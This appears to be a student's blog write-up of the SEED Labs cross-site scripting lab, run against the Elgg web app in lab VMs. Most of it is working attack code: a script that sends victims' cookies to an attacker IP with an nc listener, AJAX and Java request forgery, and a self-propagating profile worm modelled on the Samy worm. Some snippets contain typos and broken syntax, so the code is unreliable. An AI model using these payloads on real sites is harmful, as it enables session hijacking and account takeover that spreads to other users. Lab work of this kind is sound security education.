---
title: SEED Labs – Cross-Site Scripting Attack Lab
# author: Grace JyL
date: 2020-08-20 11:11:11 -0400
description:
excerpt_separator:
categories: [Lab, SEED]
tags: [Lab, XSS]
math: true
# pin: true
toc: true
# image: /assets/img/sample/devices-mockup.png
---

# SEED Labs – Cross-Site Scripting Attack Lab

[toc]

---

## Brief
- The tasks are based on a web application called `ELGG` which is open source.
- The prebuilt vm called `seedubuntu` is used to host the web application and few users already created.
- Logging in to the web app will be done from a different vm on the same virtual box network.
- user11: attacker

---

## Task 1 : Post a malicious message to display an alert window

```js
<script>alert('XSS');</script>
```

---

## Task 2 : Posting a malicious message to display cookies
- When a user14 navigates to user11's account
- user14's cookie gets displayed.
- By design, the browser does not display the code, it runs it.

```js
// short code
<script>alert(document.cookie);</script>

// long code
<script type="text/javascript" src="http网站//www.example.com/myscripts.js"></script>
// store the JavaScript program in a standalone file
// save it with the .js extension
// refer to it using the src attribute in the <script> tag.
```

---

## Task 3 : Stealing cookies from the victim’s machine
- provide code in the 'about me' section
  - obtain the cookie without having to be preset when the account of user11 is visited.
- injects a code that basically is a `GET request` for an image and also adds the cookie of the victim in the url itself.

```js
// send out the cookies using http GET
<script>
document.write('<img src=http网址attackerIP:5555?c= ' + escape(decument.cookie) + ' >');
</script>
```

- when the browser tries to load the image from the URL in the `src` field
- an `HTTP GET request` sent to the attacker’s machine.
    - in the mean time, it sends the cookies to the `port 5555` of the attacker’s machine


- the attacker has a TCP server listening to the same port.
    - `$ nc -l 5555 -v`
- The server can print out whatever it receives.
- The next time someone on the web application, say alice visits the profile of user11, the code gets executed and the attacker gains the cookie for himself. The nc output seems like -


```
// The cookie starts after %3D.

GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

---

## Task 4 : session hijacking using the stolen cookies
- stealing the session of a legitimate user by using their cookie and then add the victim as a friend.

### capture the GET request packet
- the process of adding a friend has to be known to the attacker.
  - the attacker creates another account say samy.
  - This account can be added as a friend to user11's account to observe the process of adding a friend.
- The attacker logs in to the account of samy and visits user11.
  - Then he enables the inspect mode of the browser
  - watch the requests and cookies as he adds user11 as a friend to samy.
- The friend adding process then shows a `GET request`
  - `http网址www.xsslabelgg.com/action/friends/add?friend=43&__elgg_ts=15281&__elgg_token=f0aaabcel`
  -                                                 userid &   Time Stamp  &  Security Token

> Using the `"HTTP Header Live"` add-on to Inspect HTTP Headers

![Screen Shot 2020-09-20 at 00.18.19](https://i.imgur.com/rRo8aig.png)

![Screen Shot 2020-09-20 at 00.16.52](https://i.imgur.com/lzjweg9.png)


### construct the URL for send add friend Request
- retrieve the two tokens

```js
<script>
    document.write('<img src=http网址attackerIP:5555?c= ' + elgg.security.token.__elgg_ts + '& ' + elgg.security.token.__elgg_token + '>');
</script>
```

The nc output seems like this, & separate the token.

```
GET /?c=1520227817&0fab54e97b2fa75c39d298de602a5939 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

- If the web app does not match passwords (or the case when we have the password of the intended victim)
- can simply use a python script to use the authentication and use requests module to send a `GET request` and the attack will have been executed.
- The code
  - take the input from the nc command, split into sections to get the required cookies and the tokens.
  - send a request to the desired link using the `HTTPBasicAuth` module and the cookies and parameters set along with the `GET request`.
  - This can be used in cases when the script file we make is bigger than the allowed number of characters inside the text box that has the vulnerability.

To actually make other accounts execute the malicious code, the code needs to be in the same place where the previous codes to obtain cookie and the tokens were placed. This is the case when the password of the victim is not held with the attacker.
- use the following code in javascript using AJAX
- store it into the 'about me' section of user11.

This code forms the `GET request` to duplicate the add friend action of the web app.
- When the victim say alice views the homepage of the attacker user11,
- her browser will read this code
- execute the javascript inside the tags.
- Since the user is logged in while the code is executed, the attack will run smoothly and user11 will be added to the friend list of alice.


```js
<script type="text/javascript">

window.onload = function () {
    // access Security Token __elgg_token
    var token = "&__elgg_token" + elgg.security.token.__elgg_token;

    // access Time Stamp __elgg_ts
    var ts = "&__elgg_ts" + elgg.security.token.__elgg_ts;

    // user ID from LiveHTTPHeader
    var sendurl = "http网址www.web.com/action/add?friend=42"+ts=token;

    // write the Ajax cod
    Ajax = new XMLHttpRequest();

    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Host", "www.web.com");
    Ajax.setRequestHeader("Keep-Alive", "300");
    Ajax.setRequestHeader("Connection", "keep-alive");
    Ajax.setRequestHeader("Cookie", document.cookie);  // access the session cookie
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();
}
</script>
```

### POST with Js - modify profile

![Screen Shot 2020-09-20 at 01.02.54](https://i.imgur.com/75zUEkB.png)

1. capture the POST request packet

2. construct the URL for send add friend Request

3. write the Ajax code

```js
<script type="text/javascript">
window.onload = function(){

    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content
    var content = "My new profile text.";

    //Create and send Ajax request to modify profile
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.web.com");
    Ajax.setRequestHeader("Keep-Alive", "300");
    Ajax.setRequestHeader("Connection", "keep-alive");
    Ajax.setRequestHeader("Cookie", document.cookie);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);

    var samyGuid=AAVVXX; //FILL IN
    if(elgg.session.user.guid!=samyGuid) {
        //Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
```


```java
import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
    try {
        int responseCode;
        InputStream responseIn=null;

        String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";

        // URL to be forged.
        URL url = new URL ("http网址www.xsslabelgg.com/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);

        // URLConnection instance is created
        // to further parameterize a resource request past what the state members of URL instance can represent.
        HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
        if (urlConn instanceof HttpURLConnection) {
            urlConn.setConnectTimeout(60000);
            urlConn.setReadTimeout(90000);
        }

        // addRequestProperty method
        // to add HTTP Header Information.
        // add User-Agent HTTP header to the forged HTTP packet.
        // Add other necessary HTTP Headers yourself. Cookies should be stolen
        // using the method in task3.
        urlConn.addRequestProperty("User-agent","Sun JDK 1.6");

        //HTTP Post Data which includes the information to be sent to the server.
        String data = "name=...&guid=..";

        // DoOutput flag of URL Connection
        // should be set to true to send HTTP POST message.
        urlConn.setDoOutput(true);

        // OutputStreamWriter is used to write the HTTP POST data
        // to the url connection.
        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
        wr.write(data);
        wr.flush();

        // HttpURLConnection a subclass of URLConnection is returned by
        // url.openConnection() since the url is an http request.
        if (urlConn instanceof HttpURLConnection) {
            HttpURLConnection httpConn = (HttpURLConnection) urlConn;
            // Contacts the web server
            // gets the status code from HTTP Response message.
            responseCode = httpConn.getResponseCode();
            System.out.println("Response Code = " + responseCode);

            // HTTP status code
            // HTTP_OK means the response was received Successfully.
            if (responseCode == HttpURLConnection.HTTP_OK){
                // Get the input stream from url connection object.
                responseIn = urlConn.getInputStream();
                // Create an instance for BufferedReader
                // to read the response line by line.
                BufferedReader buf_inp = new BufferedReader();
                new InputStreamReader(responseIn));
                String inputLine;
                while((inputLine = buf_inp.readLine())!=null) {
                    System.out.println(inputLine);
                    }
                }
            }
            catch (MalformedURLException e) {
                e.printStackTrace();
            }
        }
    }
}
```

---

## Task 5 : Writing an XSS worm
- coding a worm which can change the information of an account in the web app.
  - This requires the analysis of changing the 'about me' section in the web app.
- The attacker user11 uses the other account samy to update the 'about me' section to study the process.
- The 'inspect element' reveals that the process is a `POST request` which requires few parameters from the document.
  - These parameters are specific to the session and the user,
  - therefore, searching the parameters in the document

The javascript code must contain
- the `post request` required to proceed
- with the changing of the text in the 'about me' section.
- this will not affect others who view this profile.

```js
<script type="text/javascript">
var sendurl="http网址www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;

ff=new XMLHttpRequest();

ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie", document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

//                             http网址www.xsslabelgg.com/profile/         user14                  /edit
ff.setRequestHeader("Referer","http网址www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");

//      __elgg_ts=AAAA  &__elgg_token=BBBB     &description=User-11-is-great   &name=user14  &accesslevel[description]=2  &guid=user14Id0000001
params="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];

ff.send(params);
```


---

## Task 6 : Creating a self propagating worm
- exponential growth
- dynamically generate code


1. **ID/DOM Approach**:
- If the entire JavaScript program (worm) is embedded in the infected profile
- the worm code can use `DOM APIs` to retrieve a copy of itself from the web page.
- This code gets a copy of itself, and display it in an alert window:


```js
// if f the entire JavaScript program (i.e., the worm) is embedded in the infected profile
// to propagate the worm to another profile
// the worm code can use DOM APIs to retrieve a copy of itself from the web page.
<script id="worm" type="text/javascript">
    var badCode = document.getElementById("worm");
    alert(badCode.innerHTML);
</script>

<script id="worm" type="text/javascript">
    var header = "<script id=\"worm\" type=\"text/javascript\" >";

    // innerHTML only gives us the inside part of the code, not including the surrounding script tags.
    var copy = document.getElementById("worm").innerHTML;

    var tail = "</" + "script>";
    var wormCode = encodeURIComponent(header+copy+tail);
    alert(jsCode);
</script>

<script id="worm" type="text/javascript">
    // construct a copy of itself
    var selfProp = "<script id=\"worm\" type=\"text/javascript\" >".concat( document.getElementById("worm").innerHTML ).concat("</").concat("script>");
</script>
```

2. **Src/Link Approach**:
- If the worm is included using the `src` attribute in the `<script>` tag
- can simply copy the `<script>` tag to the victim’s profile, essentially infecting the profile with the same worm.

```js
<script type="text/javascript" src="http网站//example.com/xss_worm.js">
</script>
```

1. example

```js
<script id="worm" type="text/javascript">

var selfProp = "<script id=\"worm\" type=\"text/javascript\" >".concat(document.getElementById("worm").innerHTML).concat("</").concat("script>");

var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;

ff=new XMLHttpRequest();
ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie",document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));

params = "__elgg_ts=".concat(ts)
         .concat("&__elgg_token=").concat(token)
         .concat("&description=User-11-is-great")
         .concat(escape(selfProp))
         .concat("&name=").concat(elgg.session.user["username"])
         .concat("&accesslevel[description]=2&guid=").concat(elgg.session.user["guid"]);

ff.send(params);
```

- The `escape()` function converts the `inner strings` to `URLencoding` for http transfer.
- Now when a user views the profile of user11,
- the user's account will have its 'about me' section set to "User-11-is-great".
- Also the code itself will be copied to the user's page.
- Also now since the code is in the user's page, whenever a user views the account of this user, the code will get executed and the new user will also have his account modified.
- The add friend exploit can also e added to the above code as a new `XMLHttpRequest` part.
- That code will become the exact replica of the famous Samy's worm attack of 2005.

---

## Task 7 : Countermeasures
- Elgg have a built in countermeasures to defend XSS attack.
  - a custom built security plugin `HTMLawed 1.8` on the Elgg web application which on activation
  - validates the user input and removes the tags from the input.
  - This specific plugin is registered to the function `filter_tags` in the `elgg/ engine/lib/input.php` file.
  - The countermeasures have been deactivated and commented out to make the attack work.
    - To turn on the countermeasure, login to the application as admin, goto `administration -> plugins`, and select security and spam in the dropdown menu. The `HTMLawed 1.8 plugin` is below. This can now be activated.


- another built-in PHP method called `htmlspecialchars()`
  - to encode the special characters in the user input, such as encoding `"<" to &lt`, `">" to &gt;`, etc.
  - Go to the directory `elgg/views/default/output` and find the function call `htmlspecialchars` in `text.php, tagcloud.php, tags.php, access.php, tag.php, friendlytime.php, url.php, dropdown.php, email.php` and `confirmlink.php` files.
  - Uncomment the corresponding `htmlspecialchars` function calls in each file.

---

The above was a detailed description of an XSS attack taking examples from the real world Samy's Worm attack.

The above is a documentation of a lab experiment by the name XSS attack lab (Elgg) from publicly available seed labs by Syracuse University.

Seed Labs Copyright © Wenliang Du, Syracuse University.
I do not own any software mentioned in the above document.

---
.
